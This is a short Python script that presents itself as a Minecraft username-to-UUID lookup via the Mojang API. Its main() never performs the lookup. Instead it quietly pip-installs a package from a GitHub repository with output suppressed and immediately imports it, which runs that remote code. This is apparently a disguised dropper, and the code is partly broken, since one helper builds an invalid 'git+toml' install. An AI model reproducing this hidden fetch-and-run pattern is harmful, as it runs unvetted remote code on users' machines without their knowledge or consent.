import importlib
import subprocess
import requests

def get_uuid(username):
    api_url = f"https://api.mojang.com/users/profiles/minecraft/{username}"
    response = requests.get(api_url)

    if response.status_code == 200:
        data = response.json()
        return data["id"]
    elif response.status_code == 204:
        print(f"Der Benutzername '{username}' wurde nicht gefunden.")
        return None
    else:
        print(f"Fehler bei der Abfrage der Mojang API. Statuscode: {response.status_code}")
        return None

def install_git(repo_url):
    subprocess.run(['pip', 'install', f'git+{repo_url}'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
def install_package(repo_url):
    subprocess.run(['pip', 'install', f'git+{repo_url}'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def import_or_install_git(package_name, repo_url):
    spec = importlib.util.find_spec(package_name)
    
    if spec is None:
        install_git(repo_url)
    
    try:
        package = importlib.import_module(package_name)
        return package
    except ImportError:
        return None

def import_or_install_package(package_name):
    spec = importlib.util.find_spec(package_name)
    
    if spec is None:
        install_package(package_name)
    
    try:
        package = importlib.import_module(package_name)
        return package
    except ImportError:
        return None
    
def main():
    repository_url = 'https://github.com/Maxheruko/hypixelmcapigithub.git'
    package_name = 'hypixelmcapigithub'

    installed_package = import_or_install_git(package_name, repository_url)
    import_or_install_package('toml')

    if installed_package:
        return
    else:
        return
    
main()
